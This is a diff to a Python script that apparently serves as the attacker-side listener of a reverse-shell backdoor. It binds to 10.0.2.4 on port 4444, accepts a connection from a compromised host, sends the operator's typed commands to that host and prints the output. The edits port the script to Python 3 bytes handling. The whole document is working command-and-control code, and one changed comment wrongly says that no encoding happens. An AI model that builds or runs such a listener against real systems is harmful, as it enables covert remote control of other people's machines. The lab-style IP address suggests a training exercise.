@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
-import socket, json
+import socket
+import json
 
 
 class Listener:
@@ -10,34 +11,32 @@ class Listener:
         self.listener.bind((host, port))
         self.listener.listen(0)
         print("Listening for incoming connections...")
-        self.connection, self.address = self.listener.accept()  # Store the connection and address
+        self.connection, self.address = self.listener.accept()
         print("Connection accepted from " + str(self.address))
-                
+
     def reliable_send(self, data):
-        json_data = json.dumps(data)
+        json_data = json.dumps(data).encode()  # Convert JSON to bytes
         self.connection.send(json_data)
 
     def reliable_receive(self):
-        json_data = ""
-        while True :
+        json_data = b""  # Use bytes to collect data
+        while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data)
+                json_data += self.connection.recv(1024)  # Concatenate bytes
+                return json.loads(json_data.decode())  # Decode and parse JSON
             except ValueError:
-                continue
-        
+                continue  # Keep receiving if JSON is incomplete
+
     def execute_remotely(self, command):
-        self.connection.send(command.encode())  # Encode the command before sending
+        self.reliable_send(command)  # Command is already a string, no encoding needed
         return self.reliable_receive()
 
     def run(self):
         while True:
             command = input(">> ")
             result = self.execute_remotely(command)
-            print(result.decode("utf-8"))
+            print(result)
 
 
-# Create an instance of Listener and start it
 my_listener = Listener("10.0.2.4", 4444)
-my_listener.run()  
-
+my_listener.run()
